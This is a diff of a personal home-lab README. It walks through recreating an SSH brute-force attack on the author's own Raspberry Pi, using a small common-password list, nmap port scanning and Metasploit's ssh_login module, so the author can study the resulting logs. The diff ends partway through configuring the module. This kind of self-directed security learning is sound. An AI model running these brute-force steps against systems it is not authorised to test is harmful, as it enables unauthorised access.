@@ -1,6 +1,6 @@
 # Linux Bruteforce investigation.
 
-This file shows how I recreated and investigated a bruteforce attack using **Metasploit** on a Kali linux attack virtual machine to attack SSH on my Raspberry pi running Linux. I recreated this type of attack to get a better understand how logs can be used to identify a system that has been attacked.
+This file shows how I recreated and investigated a bruteforce attack using **Metasploit** on a Kali linux virtual machine to attack my Raspberry Pi running Raspberry Pi OS (Linux Debian Trixie with Raspberry Pi Desktop) using SSHw. I recreated this type of attack to get a better understand how logs can be used to identify if a system has been attacked.
 
 **What is a bruteforce attack?**  
 A bruteforce attack is when an attacker attempts to get access to a machine by testing different passwords. These passwords are usualy a list of the most common passwords or passwords taken from a data breach (credential stuffing) in hopes that the user has used a simple password or has reused their password across diffrent sites. These passwords are usually tested automatically with a script or tool such as **metasploit** or **hydra**.
@@ -28,15 +28,11 @@ Operating System: Kali Linux 10.4
 Specific Applications: Metasploit framework  
 
 **Linux vulnerable machine:**  
-Operating System: Raspberry Pi OS  
+Operating System: Raspberry Pi OS (Linux Debian Trixie with Raspberry Pi Desktop)
 Specific tools enabled: SSH (Password authentication)
 
 
 For more information on how I created my attack machine, see my **Kali Linux Attack VM** repository [here]().
-
------
-
-### Setting up my victim device.
 
 Before attacking the victim device, I first made sure to activate and connect to the device via SSH to check the device was operating correctly.
 
@@ -48,20 +44,88 @@ Once I was on the device, I checked the authentication logs for one failed authe
 
 -----
 
+### Creating my password list
+
+On my attack VM, I created a text document with 10 passwords to test (9 of the most used passwords and the correct password).
+
+```
+$ nano ~/passwords.txt
+
+123456
+password
+123456789
+qwerty
+12345
+111111
+123123
+admin
+iloveyou
+***********
+```
+
+-----
+
 ### Reconnaissance
 
-> I had to change my VM network settings to bridged to be able to scan my own network.
+Before I could attack my victim device via SSH, I first needed to find the device on my network. To do this, I searched what my IP range was by using `ip a` on my attack VM.
+```
+$ ip a
+```
 
-Before I could attack my victim machine, I first needed to find the device on my network. To do this, I used `arp-scan` to capture all the device on my network:
-```
-$ sudo arp-scan --localnet
-```
-The reason I chose to use `arp-scan` is because I could use `--localnetwork` to scan the network without the need to figure out what IP range is available.
+<img alt="ip a scan" src="" width=300px>
 
-From there I could check each device until I came accross my Raspberry Pi using `nmap` to check for an open port on port 22 (the common SSH port):
+To get the IP range, we need to look under `eth0` for `inet x.x.x.x/x`
+
+> - `eth` = ethernet, `0` = first, `eth0` = the first ethernet interface.
+> - `inet` - internet protocol (IPv4)
+
+Once I had the IP range, I could use nmap to scan the range for devices that are using port 22 (commonly used by SSH):
 ```
-$ nmap -p 22 x.x.x.x
+$ nmap -p 22 x.x.x.x/x
 ```
+
+<img alt="nmap scan for port 22" src="" width=300px>
+
+From the results of the scan, I can see my Rasperry Pi's IP address and see that port 22 is open. Now I can begin to attack the device.
+
+-----
+
+### The attack
+
+To start my attack, I started **Metasploit** on my attack VM:
+```
+msfconsole
+```
+
+Once **Metasploit** has loaded (you will see `msf6 >`), I select the SSH brute-force module:
+```
+msf6 > use auxiliary/scanner/ssh/ssh_login
+```
+
+> To see all configuration options, you can do `show options` and you will see a list of all the options you can edit:
+> ```
+> msf6 > auxiliary(scanner/ssh/ssh_login) > show options
+> ```
+
+To configue the attack, we need to adjust the following options:
+
+- Set target IP address (RHOSTS):
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set RHOSTS x.x.x.x
+```
+
+- Set the username of the user you are trying to login with:
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set USERNAME xxxxx
+```
+
+- Set the password list to use (PASS_LIST)
+
+`RHOSTS`, `USERNAME`, `PASS_FILE`
+
+
+
+
 
 
 
